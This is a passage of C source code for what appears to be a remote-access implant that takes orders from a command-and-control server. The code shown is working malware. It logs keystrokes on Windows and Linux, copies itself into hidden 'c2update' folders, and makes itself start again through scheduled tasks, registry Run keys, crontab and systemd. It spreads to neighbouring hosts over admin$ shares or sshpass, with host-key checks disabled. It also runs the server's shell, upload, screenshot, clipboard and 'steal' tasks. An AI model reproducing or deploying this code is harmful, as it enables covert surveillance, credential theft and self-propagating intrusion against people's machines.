        if (i >= 96 && i <= 105) { /* numpad */ }
        else if (!vkmap[i]) vkmap[i] = "";
    }
    while (g_keylog_running) {
        for (int vk = 8; vk <= 255; vk++) {
            SHORT s = GetAsyncKeyState(vk);
            if (s & 1) { /* key was pressed since last call */
                char k[16] = "";
                if (vk >= 'A' && vk <= 'Z') {
                    SHORT caps = GetKeyState(VK_CAPITAL);
                    SHORT shift = GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT);
                    char c;
                    if (caps & 1) c = (shift & 0x8000) ? (char)vk : (char)(vk + 32);
                    else          c = (shift & 0x8000) ? (char)(vk + 32) : (char)vk;
                    snprintf(k, sizeof(k), "%c", c);
                } else if (vk >= '0' && vk <= '9') {
                    snprintf(k, sizeof(k), "%c", (char)vk);
                } else if (vk >= 96 && vk <= 105) {
                    snprintf(k, sizeof(k), "%c", (char)(vk - 48));
                } else if (vkmap[vk] && vkmap[vk][0]) {
                    snprintf(k, sizeof(k), "%s", vkmap[vk]);
                }
                if (k[0]) keylog_append(k);
            }
        }
        Sleep(50);
    }
    return 0;
}
#else
static void *keylog_worker(void *arg) {
    (void)arg;
#ifdef __APPLE__
    /* macOS has no xinput; a real implementation would need IOHIDManager.
     * Report the limitation instead of silently doing nothing. */
    keylog_append("[keylog: not supported on macOS]");
    return NULL;
#else
    /* find first keyboard id via xinput list */
    int kid = 8;
    FILE *lfp = popen("xinput list 2>/dev/null | grep -i -m1 keyboard | sed -E 's/.*id=([0-9]+).*/\\1/'", "r");
    if (lfp) {
        char id[32] = "";
        if (fgets(id, sizeof(id), lfp)) {
            int v = atoi(id);
            if (v > 0) kid = v;
        }
        pclose(lfp);
    }

    char cmd[128];
    snprintf(cmd, sizeof(cmd), "xinput test %d 2>/dev/null", kid);

    int pfds[2];
    if (pipe(pfds) != 0) {
        keylog_append("[keylog: fork/pipe failed]");
        return NULL;
    }
    pid_t pid = fork();
    if (pid < 0) {
        close(pfds[0]); close(pfds[1]);
        keylog_append("[keylog: fork failed]");
        return NULL;
    }
    if (pid == 0) {
        close(pfds[0]);
        dup2(pfds[1], STDOUT_FILENO);
        dup2(pfds[1], STDERR_FILENO);
        close(pfds[1]);
        execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
        _exit(127);
    }
    close(pfds[1]);

    char linebuf[256];
    size_t lb = 0;
    linebuf[0] = '\0';
    while (g_keylog_running) {
        struct pollfd p;
        p.fd = pfds[0];
        p.events = POLLIN;
        int r = poll(&p, 1, 200);
        if (r == 0) continue;        /* still running, no data */
        if (r < 0) break;            /* error */
        char c;
        ssize_t n = read(pfds[0], &c, 1);
        if (n <= 0) break;           /* child exited */
        if (c == '\n') {
            if (strstr(linebuf, "key press")) {
                int code = 0;
                if (sscanf(linebuf, "key press %d", &code) == 1 && code != 0) {
                    char out[4];
                    if (code == 36)          snprintf(out, sizeof(out), "\n");
                    else if (code == 65)     snprintf(out, sizeof(out), " ");
                    else if (code >= 24 && code <= 33) /* q..p */
                        { out[0] = "qwertyuiop"[code - 24]; out[1] = '\0'; }
                    else if (code >= 38 && code <= 46) /* a..l */
                        { out[0] = "asdfghjkl"[code - 38]; out[1] = '\0'; }
                    else if (code >= 52 && code <= 58) /* z..m */
                        { out[0] = "zxcvbnm"[code - 52]; out[1] = '\0'; }
                    else
                        out[0] = '\0';
                    if (out[0]) keylog_append(out);
                }
            }
            lb = 0;
            linebuf[0] = '\0';
        } else if (lb < sizeof(linebuf) - 1) {
            linebuf[lb++] = c;
            linebuf[lb] = '\0';
        }
    }
    kill(pid, SIGKILL);
    close(pfds[0]);
    waitpid(pid, NULL, 0);
    return NULL;
#endif /* __APPLE__ */
}
#endif

static void keylog_start(void) {
    if (g_keylog_running) return;
    g_keylog_running = 1;
#ifdef _WIN32
    g_keylog_thread_handle = CreateThread(NULL, 0, keylog_worker, NULL, 0, NULL);
    if (!g_keylog_thread_handle) g_keylog_running = 0;
#else
    if (pthread_create(&g_keylog_thread, NULL, keylog_worker, NULL) != 0)
        g_keylog_running = 0;
#endif
}

static void keylog_stop(void) {
    if (!g_keylog_running) return;
    g_keylog_running = 0;
#ifndef _WIN32
    pthread_join(g_keylog_thread, NULL);
#else
    WaitForSingleObject(g_keylog_thread_handle, 2000);
    CloseHandle(g_keylog_thread_handle);
    g_keylog_thread_handle = NULL;
#endif
    keylog_append("\n");
}

static void task_keylog(const char *args_json, char *output, size_t out_size, int *exit_code) {
    char action[32] = "start";
    json_find_string(args_json, "action", action, sizeof(action));
    if (strcmp(action, "start") == 0) {
        keylog_stop();  /* fresh start */
        KEYLOG_LOCK();
        g_keylog_len = 0;
        g_keylog_buf[0] = '\0';
        KEYLOG_UNLOCK();
        keylog_start();
        snprintf(output, out_size, "keylogger started");
        *exit_code = g_keylog_running ? 0 : 1;
    } else if (strcmp(action, "stop") == 0) {
        keylog_stop();
        snprintf(output, out_size, "keylogger stopped");
        *exit_code = 0;
    } else if (strcmp(action, "dump") == 0) {
        if (g_keylog_running) keylog_stop();
        KEYLOG_LOCK();
        size_t len = g_keylog_len;
        char *dup = (char *)malloc(len + 1);
        if (dup) {
            memcpy(dup, g_keylog_buf, len);
            dup[len] = '\0';
        }
        KEYLOG_UNLOCK();
        if (dup && len > 0) {
            truncate_output(dup, output, out_size);
            free(dup);
            *exit_code = 0;
        } else {
            if (dup) free(dup);
            snprintf(output, out_size, "no keys captured yet");
            *exit_code = 0;
        }
    } else {
        snprintf(output, out_size, "unknown keylog action: %s", action);
        *exit_code = 1;
    }
}

/* ----------------------------------------------------------------- persistence / lateral */

/* absolute path of the running agent binary (relies on g_self_path from argv[0]) */
static void self_abs(char *buf, size_t n) {
    const char *self = g_self_path[0] ? g_self_path : "agent";
#ifdef _WIN32
    if (!GetFullPathNameA(self, (DWORD)n, buf, NULL))
        snprintf(buf, n, "%s", self);
#else
    if (!realpath(self, buf))
        snprintf(buf, n, "%s", self);
#endif
    buf[n - 1] = '\0';
}

static void out_append(char *output, size_t out_size, const char *fmt, ...) {
    size_t used = strlen(output);
    if (used >= out_size - 1) return;
    va_list args;
    va_start(args, fmt);
    vsnprintf(output + used, out_size - used, fmt, args);
    va_end(args);
}

/* first non-empty line of command output, trimmed, capped for error messages */
static void err_line(const char *in, char *out, size_t n) {
    if (!in) { out[0] = '\0'; return; }
    while (*in == ' ' || *in == '\t' || *in == '\r' || *in == '\n') in++;
    size_t i = 0;
    while (*in && *in != '\n' && *in != '\r' && i < n - 1) out[i++] = *in++;
    while (i > 0 && (out[i - 1] == ' ' || out[i - 1] == '\t')) i--;
    out[i] = '\0';
}

static void task_persistence(const char *args_json, char *output, size_t out_size, int *exit_code) {
    char self[4096], relaunch[8192];
    (void)args_json;
    *exit_code = 1;
    self_abs(self, sizeof(self));

#ifdef _WIN32
    snprintf(relaunch, sizeof(relaunch), "\"%s\" --server %s --token %s --interval %d --jitter %d",
             self, g_server, g_token, g_interval, g_jitter);
#else
    snprintf(relaunch, sizeof(relaunch), "'%s' --server %s --token %s --interval %d --jitter %d",
             self, g_server, g_token, g_interval, g_jitter);
#endif

    char destdir[1024], dest[1024];
#ifdef _WIN32
    const char *appdata = getenv("APPDATA");
    if (!appdata || !appdata[0]) appdata = getenv("USERPROFILE");
    if (!appdata || !appdata[0]) appdata = ".";
    snprintf(destdir, sizeof(destdir), "%s\\Microsoft\\Windows\\c2update", appdata);
    mkdirs(destdir);
    snprintf(dest, sizeof(dest), "%s\\c2agent.exe", destdir);
#else
    const char *home = getenv("HOME");
    if (!home || !home[0]) home = ".";
    snprintf(destdir, sizeof(destdir), "%s/.config/c2update", home);
    mkdirs(destdir);
    snprintf(dest, sizeof(dest), "%s/%s", destdir, path_base(self));
#endif

    if (copy_file(self, dest) != 0) {
        snprintf(output, out_size, "persistence: failed to copy self to %s", dest);
        return;
    }
    snprintf(output, out_size, "persistence: copied self to %s", dest);

    char cmd[24576];
    char sh[OUTPUT_LIMIT] = "";
    char line[8192], unit[1024];
#ifdef _WIN32
    int ok = 0;
    const char *progdata = getenv("ProgramData");
    if (!progdata || !progdata[0]) progdata = getenv("ALLUSERSPROFILE");
    if (!progdata || !progdata[0]) progdata = "C:\\ProgramData";
    char launchdir[1024], launcher[1024];
    snprintf(launchdir, sizeof(launchdir), "%s\\c2update", progdata);
    mkdirs(launchdir);
    snprintf(launcher, sizeof(launcher), "%s\\c2relaunch.cmd", launchdir);
    FILE *lf = fopen(launcher, "w");
    if (!lf) {
        snprintf(output, out_size, "persistence error: could not write launcher: %s", launcher);
        return;
    }
    fprintf(lf, "@echo off\r\nstart \"\" /b %s\r\n", relaunch);
    fclose(lf);
    out_append(output, out_size, "\npersistence: wrote launcher %s", launcher);

    snprintf(cmd, sizeof(cmd),
             "schtasks /Create /TN \"c2agent-persist\" /TR \"%s\" /SC ONLOGON /RL HIGHEST /F",
             launcher);
    int rc = run_shell(cmd, 60, sh, sizeof(sh));
    if (rc == 0) {
        ok = 1;
    } else {
        out_append(output, out_size, "\n  schtasks err: %s", sh);
        snprintf(cmd, sizeof(cmd),
                 "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v c2agent /t REG_SZ /d %s /f",
                 launcher);
        int rc2 = run_shell(cmd, 60, sh, sizeof(sh));
        if (rc2 == 0) ok = 1;
        else out_append(output, out_size, "\n  reg err: %s", sh);
    }
    out_append(output, out_size, "\n  %s",
               ok ? "launch hook registered (schtasks)" : "no launch hook registered");
    *exit_code = ok ? 0 : 1;
#else
    snprintf(line, sizeof(line), "@reboot %s # c2agent-persist", relaunch);
    snprintf(cmd, sizeof(cmd),
             "(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo \"%s\") | crontab -",
             line);
    int ok_cron = (run_shell(cmd, 60, sh, sizeof(sh)) == 0);
    if (!ok_cron) out_append(output, out_size, "\n  crontab err: %s", sh);

    int ok_sys = 0;
    snprintf(unit, sizeof(unit), "%s/c2-update.service", destdir);
    FILE *uf = fopen(unit, "w");
    if (uf) {
        fprintf(uf, "[Unit]\n"
                    "Description=c2 agent update\n\n"
                    "[Service]\n"
                    "Type=simple\n"
                    "ExecStart=/bin/sh -c \"%s\"\n"
                    "Restart=always\n\n"
                    "[Install]\n"
                    "WantedBy=default.target\n", relaunch);
        fclose(uf);
        snprintf(cmd, sizeof(cmd),
                 "systemctl --user daemon-reload 2>&1; systemctl --user enable --now %s 2>&1",
                 unit);
        if (run_shell(cmd, 60, sh, sizeof(sh)) == 0) ok_sys = 1;
        else out_append(output, out_size, "\n  systemctl err: %s", sh);
    } else {
        out_append(output, out_size, "\n  systemctl err: cannot write unit %s", unit);
    }
    out_append(output, out_size, "\n  %s",
               (ok_cron || ok_sys) ? "launch hook registered (crontab/systemd)"
                                   : "no launch hook registered");
    *exit_code = (ok_cron || ok_sys) ? 0 : 1;
#endif
}

/* local IPv4 (Windows via winsock, elsewhere via local_ip()) */
static void lateral_local_ip(char *out, size_t n) {
#ifdef _WIN32
    out[0] = '\0';
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;
    SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s == INVALID_SOCKET) { WSACleanup(); return; }
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    inet_pton(AF_INET, "8.8.8.8", &addr.sin_addr);
    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        closesocket(s);
        WSACleanup();
        return;
    }
    struct sockaddr_in local;
    int len = sizeof(local);
    getsockname(s, (struct sockaddr *)&local, &len);
    inet_ntop(AF_INET, &local.sin_addr, out, (socklen_t)n);
    closesocket(s);
    WSACleanup();
#else
    strncpy(out, local_ip(), n - 1);
    out[n - 1] = '\0';
#endif
}

/* reduce "a.b.c.d" (or shorter) to its first three octets */
static void base_from_ip(const char *ip, char *base, size_t n) {
    char tmp[64];
    snprintf(tmp, sizeof(tmp), "%s", ip);
    char *d1 = strchr(tmp, '.');
    char *d2 = d1 ? strchr(d1 + 1, '.') : NULL;
    if (!d2) { snprintf(base, n, "%s", tmp); return; }
    char *d3 = strchr(d2 + 1, '.');
    if (d3) *d3 = '\0';
    snprintf(base, n, "%s", tmp);
}

static int ip_to_u32(const char *txt, unsigned *out) {
    unsigned a, b, c, d;
    if (sscanf(txt, "%u.%u.%u.%u", &a, &b, &c, &d) != 4) return -1;
    if (a > 255 || b > 255 || c > 255 || d > 255) return -1;
    *out = (a << 24) | (b << 16) | (c << 8) | d;
    return 0;
}

/* extract IPv4 tokens from arp/ip-neigh text, filter to base, exclude own ip,
 * dedupe, numeric sort, cap 30 */
static int lateral_peers(const char *txt, const char *self, const char *base,
                         unsigned *out, int max) {
    unsigned own = 0;
    if (ip_to_u32(self, &own) != 0) own = 0;
    int n = 0;
    const char *p = txt;
    while (*p && n < max) {
        while (*p && !(*p >= '0' && *p <= '9')) p++;
        if (!*p) break;
        const char *s = p;
        unsigned a, b, c, d;
        int matched = sscanf(s, "%u.%u.%u.%u", &a, &b, &c, &d);
        while (*p && ((*p >= '0' && *p <= '9') || *p == '.')) p++;
        if (matched != 4) continue;
        if (a > 255 || b > 255 || c > 255 || d > 255) continue;
        if (a == 0 || a >= 224) continue;
        unsigned ip = (a << 24) | (b << 16) | (c << 8) | d;
        if (own && ip == own) continue;
        char tri[32];
        snprintf(tri, sizeof(tri), "%u.%u.%u", a, b, c);
        if (strncmp(tri, base, strlen(base)) != 0) continue;
        int dup = 0;
        for (int i = 0; i < n; i++) if (out[i] == ip) { dup = 1; break; }
        if (!dup) out[n++] = ip;
    }
    for (int i = 1; i < n; i++) {
        unsigned key = out[i];
        int j = i - 1;
        while (j >= 0 && out[j] > key) { out[j + 1] = out[j]; j--; }
        out[j + 1] = key;
    }
    return n;
}

static void task_lateral(const char *args_json, char *output, size_t out_size, int *exit_code) {
    char subnet[64] = "", user[128] = "", pass[256] = "";
    json_find_string(args_json, "subnet", subnet, sizeof(subnet));
    json_find_string(args_json, "user", user, sizeof(user));
    json_find_string(args_json, "pass", pass, sizeof(pass));
    const char *eu = getenv("C2_LAT_USER");
    const char *ep = getenv("C2_LAT_PASS");
    if (!user[0] && eu) snprintf(user, sizeof(user), "%s", eu);
    if (!pass[0] && ep) snprintf(pass, sizeof(pass), "%s", ep);

    char self[4096];
    self_abs(self, sizeof(self));

    char ip[64] = "", base[64] = "";
    lateral_local_ip(ip, sizeof(ip));
    if (subnet[0]) base_from_ip(subnet, base, sizeof(base));
    else if (ip[0]) base_from_ip(ip, base, sizeof(base));
    if (!base[0]) {
        snprintf(output, out_size, "lateral: no LAN peers found");
        *exit_code = 1;
        return;
    }
    logmsg("lateral: subnet base %s", base);

    unsigned peers[30];
    int n = 0;
    char sh[OUTPUT_LIMIT] = "";
    run_shell("arp -a", 20, sh, sizeof(sh));
    if (sh[0]) n = lateral_peers(sh, ip, base, peers, 30);
#ifndef _WIN32
    if (n == 0) {
        char sh2[OUTPUT_LIMIT] = "";
        run_shell("ip neigh", 20, sh2, sizeof(sh2));
        if (sh2[0]) n = lateral_peers(sh2, ip, base, peers, 30);
    }
#endif

    if (n == 0) {
        snprintf(output, out_size, "lateral: no LAN peers found");
        *exit_code = 1;
        return;
    }

    snprintf(output, out_size, "lateral: %d peer(s): ", n);
    size_t used = strlen(output);
    for (int i = 0; i < n && used < out_size; i++) {
        int k = snprintf(output + used, out_size - used, "%s%u.%u.%u.%u",
                         i ? "," : "", (peers[i] >> 24) & 0xff, (peers[i] >> 16) & 0xff,
                         (peers[i] >> 8) & 0xff, peers[i] & 0xff);
        if (k < 0) break;
        used += (size_t)k;
    }
    if (used < out_size) output[used] = '\0';

    int deployed = 0, failed = 0, skipped = 0;
    for (int i = 0; i < n; i++) {
        char host[16];
        snprintf(host, sizeof(host), "%u.%u.%u.%u", (peers[i] >> 24) & 0xff,
                 (peers[i] >> 16) & 0xff, (peers[i] >> 8) & 0xff, peers[i] & 0xff);
        char status[512] = "";
        if (!user[0] || !pass[0]) {
            snprintf(status, sizeof(status),
                     "skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)");
            skipped++;
            out_append(output, out_size, "\n  %s: %s", host, status);
            continue;
        }
#ifdef _WIN32
        {
            char cmd[16384], rbuf[OUTPUT_LIMIT] = "", name[128], remote[1024], relaunch[8192];
            snprintf(name, sizeof(name), "%s", path_base(self));
            snprintf(remote, sizeof(remote), "c:\\windows\\%s", name);
            snprintf(relaunch, sizeof(relaunch),
                     "\"%s\" --server %s --token %s --interval %d --jitter %d",
                     remote, g_server, g_token, g_interval, g_jitter);
            char errbuf[256];
            snprintf(cmd, sizeof(cmd), "net use \\\\%s\\admin$ /user:%s \"%s\"", host, user, pass);
            if (run_shell(cmd, 30, rbuf, sizeof(rbuf)) != 0) {
                err_line(rbuf, errbuf, sizeof(errbuf));
                snprintf(status, sizeof(status), "failed (net use: %s)", errbuf);
                failed++;
            } else {
                snprintf(cmd, sizeof(cmd), "copy /y \"%s\" \"\\\\%s\\admin$\\%s\"", self, host, name);
                if (run_shell(cmd, 30, rbuf, sizeof(rbuf)) != 0) {
                    err_line(rbuf, errbuf, sizeof(errbuf));
                    snprintf(status, sizeof(status), "failed (copy: %s)", errbuf);
                    failed++;
                } else {
                    snprintf(cmd, sizeof(cmd),
                             "schtasks /Create /S %s /TN \"c2agent-lateral\" /TR \"%s\" /SC ONLOGON /RU %s /RP %s /RL HIGHEST /F",
                             host, relaunch, user, pass);
                    if (run_shell(cmd, 30, rbuf, sizeof(rbuf)) == 0) {
                        snprintf(status, sizeof(status),
                                 "deployed (file dropped + scheduled c2agent-lateral)");
                    } else {
                        err_line(rbuf, errbuf, sizeof(errbuf));
                        snprintf(status, sizeof(status), "deployed (file dropped; task: %s)", errbuf);
                    }
                    deployed++;
                }
                snprintf(cmd, sizeof(cmd), "net use \\\\%s\\admin$ /delete /y", host);
                run_shell(cmd, 30, rbuf, sizeof(rbuf));
            }
        }
#else
        {
            char cmd[65536], rbuf[OUTPUT_LIMIT] = "", name[128], relaunch[8192];
            snprintf(cmd, sizeof(cmd), "command -v sshpass");
            if (run_shell(cmd, 10, rbuf, sizeof(rbuf)) != 0 || !rbuf[0]) {
                snprintf(status, sizeof(status), "skipped (sshpass not installed)");
                skipped++;
            } else {
                char errbuf[256];
                snprintf(name, sizeof(name), "%s", path_base(self));
                snprintf(relaunch, sizeof(relaunch),
                         "'/tmp/%s' --server %s --token %s --interval %d --jitter %d",
                         name, g_server, g_token, g_interval, g_jitter);
                snprintf(cmd, sizeof(cmd),
                         "sshpass -p '%s' scp -o StrictHostKeyChecking=no -o ConnectTimeout=8 '%s' %s@%s:/tmp/%s",
                         pass, self, user, host, name);
                if (run_shell(cmd, 60, rbuf, sizeof(rbuf)) != 0) {
                    err_line(rbuf, errbuf, sizeof(errbuf));
                    snprintf(status, sizeof(status), "failed (scp: %s)", errbuf);
                    failed++;
                } else {
                    snprintf(cmd, sizeof(cmd),
                             "sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 %s@%s '%s &>/dev/null &'",
                             pass, user, host, relaunch);
                    if (run_shell(cmd, 30, rbuf, sizeof(rbuf)) == 0) {
                        snprintf(status, sizeof(status), "deployed (file uploaded + launched)");
                    } else {
                        err_line(rbuf, errbuf, sizeof(errbuf));
                        snprintf(status, sizeof(status), "deployed (file uploaded; launch: %s)", errbuf);
                    }
                    deployed++;
                }
            }
        }
#endif
        out_append(output, out_size, "\n  %s: %s", host, status);
    }
    out_append(output, out_size, "\nlateral: deployed=%d failed=%d skipped=%d",
               deployed, failed, skipped);
    *exit_code = 0;
}

/* ----------------------------------------------------------------- main */

int main(int argc, char *argv[]) {
    /* Parse arguments */
    strncpy(g_self_path, argv[0], sizeof(g_self_path) - 1);
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--server") == 0 && i + 1 < argc)
            strncpy(g_server, argv[++i], sizeof(g_server) - 1);
        else if (strcmp(argv[i], "--token") == 0 && i + 1 < argc)
            strncpy(g_token, argv[++i], sizeof(g_token) - 1);
        else if (strcmp(argv[i], "--interval") == 0 && i + 1 < argc)
            g_interval = atoi(argv[++i]);
        else if (strcmp(argv[i], "--jitter") == 0 && i + 1 < argc)
            g_jitter = atoi(argv[++i]);
        else if (strcmp(argv[i], "--verbose") == 0)
            g_verbose = 1;
    }

    /* Env var fallback */
    if (!g_server[0]) { char *e = getenv("C2_SERVER"); if (e) strncpy(g_server, e, sizeof(g_server) - 1); }
    if (!g_token[0])  { char *e = getenv("C2_TOKEN");  if (e) strncpy(g_token, e, sizeof(g_token) - 1); }

    if (!g_server[0] || !g_token[0]) {
        fprintf(stderr, "usage: ./agent --server URL --token TOKEN [--interval N] [--jitter N] [--verbose]\n");
        return 1;
    }

    /* Strip trailing slash */
    size_t slen = strlen(g_server);
    if (slen > 0 && g_server[slen - 1] == '/')
        g_server[slen - 1] = '\0';

    curl_global_init(CURL_GLOBAL_ALL);
    load_id();
    if (!g_agent_id[0]) register_agent();

    logmsg("agent running against %s (interval %ds)", g_server, g_interval);

    srand((unsigned int)time(NULL));

    while (1) {
        /* service clone watchers (synchronous, each on its own interval) */
        check_clone_watchers();

        char resp[MAX_RESPONSE] = "";
        int code = checkin(resp, sizeof(resp));

        if (code == 200 && resp[0]) {
            /* Parse every task object in the tasks array (brace-matched, so we
             * handle more than the first task per check-in). */
            char *tasks_start = strstr(resp, "\"tasks\"");
            if (tasks_start) {
                char *arr_open = strchr(tasks_start, '[');
                char *cursor = arr_open ? arr_open + 1 : NULL;
                while (cursor) {
                    char *obj_start = strchr(cursor, '{');
                    if (!obj_start) break;

                    /* find matching closing brace */
                    int depth = 0;
                    char *obj_end = obj_start;
                    do {
                        if (*obj_end == '{') depth++;
                        else if (*obj_end == '}') depth--;
                        obj_end++;
                    } while (depth > 0 && *obj_end);

                    size_t obj_len = (size_t)(obj_end - obj_start);
                    char obj[8192];
                    if (obj_len < sizeof(obj)) {
                        memcpy(obj, obj_start, obj_len);
                        obj[obj_len] = '\0';

                        char task_id[128] = "", task_type[64] = "", args_buf[2048] = "";
                        json_find_string(obj, "task_id", task_id, sizeof(task_id));
                        json_find_string(obj, "type", task_type, sizeof(task_type));

                        char *targs = strstr(obj, "\"args\"");
                        if (targs) {
                            char *args_start = strchr(targs, '{');
                            if (args_start) {
                                int d = 0;
                                char *args_end = args_start;
                                do {
                                    if (*args_end == '{') d++;
                                    else if (*args_end == '}') d--;
                                    args_end++;
                                } while (d > 0 && *args_end);
                                size_t args_len = (size_t)(args_end - args_start);
                                if (args_len >= sizeof(args_buf)) args_len = sizeof(args_buf) - 1;
                                memcpy(args_buf, args_start, args_len);
                                args_buf[args_len] = '\0';
                            }
                        }

                        if (task_id[0] && task_type[0]) {
                            logmsg("running task %s (%s)", task_id, task_type);

                            char output[OUTPUT_LIMIT + 256] = "";
                            int exit_code = 0;
                            int should_exit = 0;

                            if (strcmp(task_type, "shell") == 0) {
                                char command[4096] = "";
                                int timeout = SHELL_TIMEOUT;
                                json_find_string(args_buf, "command", command, sizeof(command));
                                char tstr[32] = "";
                                if (json_find_string(args_buf, "timeout", tstr, sizeof(tstr)) == 0)
                                    timeout = atoi(tstr);
                                if (timeout < 1) timeout = 1;
                                if (timeout > 3600) timeout = 3600;
                                exit_code = run_shell(command, timeout, output, sizeof(output));
                            } else if (strcmp(task_type, "download") == 0) {
                                task_download(task_id, args_buf, output, sizeof(output), &exit_code);
                            } else if (strcmp(task_type, "upload") == 0) {
                                task_upload(task_id, args_buf, output, sizeof(output), &exit_code);
                            } else if (strcmp(task_type, "screenshot") == 0) {
                                task_screenshot(task_id, args_buf, output, sizeof(output), &exit_code);
                            } else if (strcmp(task_type, "sleep") == 0) {
                                char sstr[32] = "10";
                                json_find_string(args_buf, "seconds", sstr, sizeof(sstr));
                                int secs = atoi(sstr);
                                if (secs < 1) secs = 1;
                                g_interval = secs;
                                snprintf(output, sizeof(output), "heartbeat interval set to %ds", g_interval);
                            } else if (strcmp(task_type, "keylog") == 0) {
                                task_keylog(args_buf, output, sizeof(output), &exit_code);
                            } else if (strcmp(task_type, "clipboard") == 0) {
                                task_clipboard(args_buf, output, sizeof(output), &exit_code);
                            } else if (strcmp(task_type, "steal") == 0) {
                                task_steal(task_id, args_buf, output, sizeof(output), &exit_code);
                            } else if (strcmp(task_type, "clone") == 0) {
                                task_clone(args_buf, output, sizeof(output), &exit_code);
                            } else if (strcmp(task_type, "persistence") == 0) {
                                task_persistence(args_buf, output, sizeof(output), &exit_code);
                            } else if (strcmp(task_type, "lateral") == 0) {
                                task_lateral(args_buf, output, sizeof(output), &exit_code);
                            } else if (strcmp(task_type, "exit") == 0) {
                                snprintf(output, sizeof(output), "exiting");
                                should_exit = 1;
                            } else {
                                snprintf(output, sizeof(output), "unknown task type: %s", task_type);
                                exit_code = 1;
                            }

                            report_result(task_id, output, exit_code, "");
                            if (should_exit) {
                                logmsg("exit task received — shutting down");
                                curl_global_cleanup();
                                return 0;
                            }
                        }
                    }
                    cursor = obj_end;
                }
            }
        }

        int delay = g_interval;
        if (g_jitter > 0) delay += rand() % (g_jitter + 1);
        sleep(delay);
    }

    curl_global_cleanup();
    return 0;
}
